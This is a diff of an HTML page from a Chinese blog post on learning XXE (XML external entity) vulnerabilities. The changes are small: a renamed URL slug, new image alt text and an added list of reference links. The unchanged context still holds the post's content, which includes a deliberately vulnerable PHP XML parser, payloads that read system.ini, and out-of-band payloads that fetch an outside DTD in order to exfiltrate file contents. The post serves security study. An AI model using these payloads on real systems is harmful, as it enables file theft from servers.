@@ -99,18 +99,18 @@
   <meta name="description" content="[TOC] 本文只是对XXE漏洞学习，参考多篇文章 一、XML基础​    XML 用于编辑电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据，是一种允许用户的对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义、文档元素。 1234567&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;    &amp;lt;!--">
 <meta property="og:type" content="article">
 <meta property="og:title" content="0x516A&#39;Blog">
-<meta property="og:url" content="http://yoursite.com/2019/02/17/XXE-漏洞学习/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/02/17/XXE漏洞学习/index.html">
 <meta property="og:site_name" content="0x516A&#39;Blog">
 <meta property="og:description" content="[TOC] 本文只是对XXE漏洞学习，参考多篇文章 一、XML基础​    XML 用于编辑电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据，是一种允许用户的对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义、文档元素。 1234567&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;    &amp;lt;!--">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://yoursite.com/2019/02/17/XXE-漏洞学习/XXE-漏洞学习/1.png">
-<meta property="og:image" content="http://yoursite.com/2019/02/17/XXE-漏洞学习/XXE-漏洞学习/2.png">
-<meta property="og:image" content="http://yoursite.com/2019/02/17/XXE-漏洞学习/XXE-漏洞学习/3.png">
-<meta property="og:updated_time" content="2019-02-17T09:50:53.583Z">
+<meta property="og:image" content="http://yoursite.com/2019/02/17/XXE漏洞学习/XXE漏洞学习/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/02/17/XXE漏洞学习/XXE漏洞学习/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/02/17/XXE漏洞学习/XXE漏洞学习/3.png">
+<meta property="og:updated_time" content="2019-02-17T09:56:25.596Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="0x516A&#39;Blog">
 <meta name="twitter:description" content="[TOC] 本文只是对XXE漏洞学习，参考多篇文章 一、XML基础​    XML 用于编辑电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据，是一种允许用户的对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义、文档元素。 1234567&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;    &amp;lt;!--">
-<meta name="twitter:image" content="http://yoursite.com/2019/02/17/XXE-漏洞学习/XXE-漏洞学习/1.png">
+<meta name="twitter:image" content="http://yoursite.com/2019/02/17/XXE漏洞学习/XXE漏洞学习/1.png">
 
 
 
@@ -119,7 +119,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/02/17/XXE-漏洞学习/">
+  <link rel="canonical" href="http://yoursite.com/2019/02/17/XXE漏洞学习/">
 
 
 
@@ -374,7 +374,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/17/XXE-漏洞学习/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/17/XXE漏洞学习/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="C'est La Vie">
@@ -417,7 +417,7 @@
                 
               
 
-              <time title="Created: 2019-02-17 14:55:42 / Modified: 17:50:53" itemprop="dateCreated datePublished" datetime="2019-02-17T14:55:42+08:00">2019-02-17</time>
+              <time title="Created: 2019-02-17 14:55:42 / Modified: 17:56:25" itemprop="dateCreated datePublished" datetime="2019-02-17T14:55:42+08:00">2019-02-17</time>
             
 
             
@@ -482,13 +482,13 @@
 <p>如：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure>
 <p>XML实体分为 普通实体和参数实体 。上面介绍的为普通实体 使用场合则为XML文档中</p>
-<p><img src="XXE-漏洞学习/1.png" alt=""></p>
+<p><img src="XXE漏洞学习/1.png" alt="2"></p>
 <h2 id="二、XML外部实体注入-XML-External-Entity-XEE"><a href="#二、XML外部实体注入-XML-External-Entity-XEE" class="headerlink" title="二、XML外部实体注入(XML External Entity XEE)"></a>二、XML外部实体注入(XML External Entity XEE)</h2><p>​       当允许引用外部实体时候，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口等危害。</p>
 <h3 id="有回显读取本地敏感文件"><a href="#有回显读取本地敏感文件" class="headerlink" title="有回显读取本地敏感文件"></a>有回显读取本地敏感文件</h3><h4 id="普通实体引用外部实体"><a href="#普通实体引用外部实体" class="headerlink" title="普通实体引用外部实体"></a>普通实体引用外部实体</h4><p>服务器 xml.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> $creds;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="XXE-漏洞学习/2.png" alt=""></p>
+<p><img src="XXE漏洞学习/2.png" alt="3"></p>
 <h4 id="参数实体引用外部实体"><a href="#参数实体引用外部实体" class="headerlink" title="参数实体引用外部实体"></a>参数实体引用外部实体</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE creds [  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY  % a SYSTEM "192.168.11.57:8888/outdtd.dtd"&gt; %a;]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br></pre></td></tr></table></figure>
 <h3 id="无回显读取本地的敏感文件"><a href="#无回显读取本地的敏感文件" class="headerlink" title="无回显读取本地的敏感文件"></a>无回显读取本地的敏感文件</h3><p>​    可以看到在上面两个实验中，都是有显示，而另外一种情况无回显</p>
@@ -499,8 +499,10 @@
 <p>Payload </p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE convert [ </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "http://ip/test.dtd"&gt;</span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
 <h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p> 在上面当中一直使用的为 file 协议 。在真实情况中应该清楚为什么平台，能够使用什么协议。</p>
-<p><img src="XXE-漏洞学习/3.png" alt=""></p>
+<p><img src="XXE漏洞学习/3.png" alt="1"></p>
 <h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><p>可以看出 XXE 漏洞，知识点涉及较多内容。如 其它利用 危害  Dos拒绝服务、内网主机探测 、内网主机端口扫描。 由于内容较多 之后在一一更新补充。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a></p>
+<p><a href="https://xz.aliyun.com/t/3357#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-0</a></p>
 
       
     </div>
@@ -702,7 +704,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、XML基础"><span class="nav-number">1.</span> <span class="nav-text">一、XML基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DTD"><span class="nav-number">1.1.</span> <span class="nav-text">DTD</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DTD-实体"><span class="nav-number">1.2.</span> <span class="nav-text">DTD -实体</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、XML外部实体注入-XML-External-Entity-XEE"><span class="nav-number">2.</span> <span class="nav-text">二、XML外部实体注入(XML External Entity XEE)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#有回显读取本地敏感文件"><span class="nav-number">2.1.</span> <span class="nav-text">有回显读取本地敏感文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#普通实体引用外部实体"><span class="nav-number">2.1.1.</span> <span class="nav-text">普通实体引用外部实体</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参数实体引用外部实体"><span class="nav-number">2.1.2.</span> <span class="nav-text">参数实体引用外部实体</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无回显读取本地的敏感文件"><span class="nav-number">2.2.</span> <span class="nav-text">无回显读取本地的敏感文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用"><span class="nav-number">2.3.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、总结"><span class="nav-number">3.</span> <span class="nav-text">三、总结</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、XML基础"><span class="nav-number">1.</span> <span class="nav-text">一、XML基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DTD"><span class="nav-number">1.1.</span> <span class="nav-text">DTD</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DTD-实体"><span class="nav-number">1.2.</span> <span class="nav-text">DTD -实体</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、XML外部实体注入-XML-External-Entity-XEE"><span class="nav-number">2.</span> <span class="nav-text">二、XML外部实体注入(XML External Entity XEE)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#有回显读取本地敏感文件"><span class="nav-number">2.1.</span> <span class="nav-text">有回显读取本地敏感文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#普通实体引用外部实体"><span class="nav-number">2.1.1.</span> <span class="nav-text">普通实体引用外部实体</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参数实体引用外部实体"><span class="nav-number">2.1.2.</span> <span class="nav-text">参数实体引用外部实体</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无回显读取本地的敏感文件"><span class="nav-number">2.2.</span> <span class="nav-text">无回显读取本地的敏感文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用"><span class="nav-number">2.3.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、总结"><span class="nav-number">3.</span> <span class="nav-text">三、总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
             
 
           </div>
@@ -860,7 +862,7 @@
   
     <script>
   window.livereOptions = {
-    refer: '2019/02/17/XXE-漏洞学习/'
+    refer: '2019/02/17/XXE漏洞学习/'
   };
   (function(d, s) {
     var j, e = d.getElementsByTagName(s)[0];
